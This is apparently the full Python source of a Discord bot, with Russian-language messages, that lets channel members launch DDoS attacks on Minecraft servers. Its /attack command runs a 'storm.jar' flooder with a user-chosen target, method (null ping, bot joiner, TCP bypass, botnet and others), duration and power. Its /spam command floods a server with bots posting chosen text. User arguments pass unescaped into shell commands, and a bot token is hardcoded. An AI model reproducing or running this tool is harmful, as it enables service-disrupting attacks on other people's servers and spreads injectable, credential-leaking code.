import discord
from discord.ext import commands
import os
import threading
import socket
import discord.utils
import requests
import urllib.request
import json
import time
import asyncio
import random
import sqlite3
import psutil
import mcstatus
import datetime
import getpass
from mcstatus import MinecraftServer
from discord import utils
from discord.utils import get
from psutil import Process, virtual_memory
from gtts import gTTS
from subprocess import Popen, TimeoutExpired, run
from discord import Member
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext import commands

token = "OTYxOTAzMDM2NDI5NjUxOTg4.Yk_wAw.SjpBCMdGA9RzJ2AAoTPc4TnVWWc"
methods_list = ['join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'botjoiner', 'power', 'spoof', 'ping', 'spam', 'killer', 'nullping', 'charonbot', 'multikiller', 'packet', 'handshake', 'bighandshake', 'query', 'bigpacket', 'network', 'randombytes', 'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 'colorcrasher', 'tcphit', 'queue', 'botnet', 'tcpbypass', 'ultimatesmasher', 'sf', 'nabcry']
protocols_list = ['758', '757', '757', '756', '754', '753', '751', '736', '736', '735', '578', '575', '573', '498', '490', '485', '480', '477', '404', '401', '393', '340', '338', '335']
channel_id = 964048671220060201
blocked_text = ['dsc.gg', 'dsc,gg', 'discord']

client = commands.Bot(command_prefix='/')
client.remove_command('help')


@client.event
async def on_ready():
    while True:
        await client.change_presence(activity=discord.Game(name="/help"))
        await asyncio.sleep(10.0)
        await client.change_presence(activity=discord.Game(name="/invite"))
        await asyncio.sleep(10.0)
    print('Your Q4Cher started!')


@client.event 
async def on_command_error(ctx, error): 
    if isinstance(error, commands.CommandNotFound): 
        em = discord.Embed(title=f"Ошибка.", description=f"**Команда недоступна, либо отсутствует.**", color=ctx.author.color) 
        await ctx.send(embed=em) 
    if isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(title=f"Ошибка.", description=f"**Команда отправлена неправильно.**", color=ctx.author.color)
        await ctx.send(embed=em)


@client.command()
async def stop(ctx):
    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"Ошибка.", description=f"Данный чат является недействительным для отправки команд.", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    os.system("pkill 'java'")
    embed = discord.Embed(
        title='Attack Stopped!',
        description=f'{ctx.author.mention} остановил все атаки.',
        color=discord.Colour.random()
    )

    await ctx.send(embed=embed)


@client.command()
async def proxy(ctx):
    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"Ошибка.", description=f"Данный чат является недействительным для отправки команд.", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    def update():
        os.system('wget https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt')
        os.system('mv socks4.txt proxies.txt')

    t1 = threading.Thread(target=update)

    t1.start()

    await ctx.send("Proxy Updated")


@client.command()
async def help(ctx):
    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"Ошибка.", description=f"Данный чат является недействительным для отправки команд.", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(
        title="Menu",
        color=discord.Colour.random()
    )
    embed.add_field(name='**Attack**', value='/attack <ip:port> <protocol> <method> <time> <cps>', inline=False)
    embed.add_field(name='**Spam**', value='/spam <ip:port> <time> <text>', inline=False)
    embed.add_field(name='**Methods**', value='/methods', inline=False)
    embed.add_field(name='**Protocols**', value='/protocols', inline=False)
    embed.add_field(name='**Resolve**', value='/resolve', inline=False)
    embed.add_field(name='**Proxy**', value='/proxy', inline=False)
    embed.set_footer(text="Thanks the DDoS using")
    await ctx.send(embed=embed)


@client.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Good!",
        color=discord.Colour.red()
    )
    if json_object["online"] == "True":
        status = "Server offline"
        embed.add_field(name='ip:', value=json_object["ip"], inline=True)
        embed.add_field(name='port:', value=json_object["port"], inline=True)
        embed.add_field(name="Hostname:", value=json_object["hostname"], inline=True)
        embed.add_field(name="Status:", value=f"{status}", inline=True)

        g = json_object["ip"]
        gb = json_object["port"]

        embed.set_footer(text="Q4Cher")
        await ctx.send(embed=embed)
    else:
        statas = "Server online"
        embed.add_field(name='IP:', value=json_object["ip"], inline=True)
        embed.add_field(name='Port:', value=json_object["port"], inline=True)
        embed.add_field(name="Hostname:", value=json_object["hostname"], inline=True)
        embed.add_field(name="Status:", value=statas, inline=True)

        g = json_object["ip"]
        gb = json_object["port"]

        embed.set_footer(text="good resolve")
        await ctx.send(embed=embed)



@client.command()
async def methods(ctx):
    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"Ошибка.", description=f"Данный чат является недействительным для отправки команд.", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(
        title="Methods",
        color=discord.Colour.green()
    )
    embed.add_field(name='Methods:', value=', '.join([i for i in methods_list]), inline=True)
    embed.set_footer(text="все методы указывать с маленькой буквы")
    await ctx.send(embed=embed)   


@client.command()
async def protocols(ctx):
    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"Ошибка.", description=f"Данный чат является недействительным для отправки команд.", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(
        title="Versions : Protocols",
        color=discord.Colour.blue()
    )
    embed.add_field(name='**1.18.2**:', value='758', inline=True)
    embed.add_field(name='**1.18.1**:', value='757', inline=True)
    embed.add_field(name='**1.18**:', value='757', inline=True)
    embed.add_field(name='**1.17.1**:', value='756', inline=True)
    embed.add_field(name='**1.16.5**:', value='754', inline=True)
    embed.add_field(name='**1.16.3**:', value='753', inline=True)
    embed.add_field(name='**1.16.2**:', value='751', inline=True)
    embed.add_field(name='**1.16.1**:', value='736', inline=True)
    embed.add_field(name='**1.16**:', value='735', inline=True)
    embed.add_field(name='**1.15.2**:', value='578', inline=True)
    embed.add_field(name='**1.15.1**:', value='575', inline=True)
    embed.add_field(name='**1.15**:', value='573', inline=True)
    embed.add_field(name='**1.14.4**:', value='498', inline=True)
    embed.add_field(name='**1.14.3**:', value='490', inline=True)
    embed.add_field(name='**1.14.2**:', value='485', inline=True)
    embed.add_field(name='**1.14.1**:', value='480', inline=True)
    embed.add_field(name='**1.14**:', value='477', inline=True)
    embed.add_field(name='**1.13.2**:', value='404', inline=True)
    embed.add_field(name='**1.13.1**:', value='401', inline=True)
    embed.add_field(name='**1.13**:', value='393', inline=True)
    embed.add_field(name='**1.12.2**:', value='340', inline=True)
    embed.set_footer(text="Its all protocols")
    await ctx.send(embed=embed)  


@client.command()
async def invite(ctx):
    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"Ошибка.", description=f"Данный чат является недействительным для отправки команд.", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(
        title="Invites",
        color=discord.Colour.blue()
    )
    embed.add_field(name='**Invite link**:', value='https://dsc.gg/snddos', inline=True)
    embed.set_footer(text="thanks you")
    await ctx.send(embed=embed)    


@client.command()
async def attack(ctx, arg1, arg2, arg3, arg4, arg5):
    def attack():
        os.system(
            f"java -Xmx48G -server -jar storm.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")

    embed = discord.Embed(
        title='Sent attack...',
        description=f'Атаку запустил {ctx.author.mention}',
        color=discord.Colour.blue()
    )

    embed.add_field(name='Адрес:', value=f'{arg1}', inline=False)
    embed.add_field(name='Версия:', value=f'{arg2}', inline=False)
    embed.add_field(name='Метод:', value=f'{arg3}', inline=False)
    embed.add_field(name='Время', value=f'{arg4}', inline=False)
    embed.add_field(name='Мощность:', value=f'{arg5}', inline=False) 
    embed.set_image(url=f'https://netshop-isp.com.cy/static/DDoSAttack-af9540e64216c9d23e9b75590bb156d9.gif')
    embed.set_footer(text="спасибо, что используете наш DDoS")
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)
    if json_object["online"] == False:
        emb = discord.Embed(color = discord.Color.red())
        emb.add_field(name = 'Ошибка!', value = '**Сервер выключен либо его не существует**')
        await ctx.send(embed=emb)
        return

    if str(arg2) not in protocols_list:
        em = discord.Embed(title=f"Ошибка.", description=f"**Недопустимое значение, используйте протоколы, которые указаны в списке.**", color=ctx.author.color)
        await ctx.send(embed=em)
        return


    if arg3 not in methods_list:
        em = discord.Embed(title=f"Ошибка.", description=f"**Метод не обнаружен - $methods**", color=ctx.author.color)
        await ctx.send(embed=em) 
        return
    
    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"Ошибка.", description=f"**Данный чат недействителен для отправки атаки.**", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    
    if int(arg4) > 240:
        em = discord.Embed(title=f"Ошибка.", description=f"**Значение  не распознано, используйте от 1 до 120 секунд.**", color=ctx.author.color)
        await ctx.send(embed=em)
        return

    if int(arg5) > 150000 or int(arg5) < 1:
        em = discord.Embed(title=f"Ошибка.", description=f"**Значение не распознано, попробуйте от -1 до 150000.**", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    
    t1 = threading.Thread(target=attack)
    
    t1.start()

    await ctx.send(embed=embed)


@client.command()
async def spam(ctx, arg1, arg3, *, arg4):
    if ctx.channel.id in channels:
        if int(arg3) > 90:
            await ctx.send(f"Ошибка: Максимум времяни - 90 секунд! Вы указали {arg3}.")
        else:
            conftext = f'infoFormat: 1 \nbotsCount: 3 \njoinDelay: 1 \nrandomNicks: true \nrandomNicksLength: 8 \nrandomPasswords: true \nrandomPasswordsLength: 8 \ndoubleJoin: true \nantiBotFilter: false \ntestMode: true \ntestModeIp: "{arg1}" \nautoRestart: false \nautoRestartDelay: 1 \nmove: false \ncommands: \n  - "wait 2s" \n  - "{arg4} | Free spam by dsc,gg/q4ch"'
            conf=open("config.yml", "w+")
            conf.write(conftext)
            conf.close()
            embed=discord.Embed(title="Атака успешно отправлена", color=discord.Color(0x2F3136))
            embed.add_field(name=f"Сервер: {arg1}", value=f"Время: {arg3} секунд(ы), текст спама: {arg4}", inline=False)
            embed.set_footer(text="")
            embed.set_image(url="https://thumbs.gfycat.com/NaughtySoftAmericancrow-max-1mb.gif")
            await ctx.send(embed=embed)
            startcmd = f"timeout {arg3}s java -Xmx2G -jar bot.jar"
            Popen(startcmd, shell=True)
    else:
        await ctx.send("Ошибка: неверный канал!")

    
client.run(token)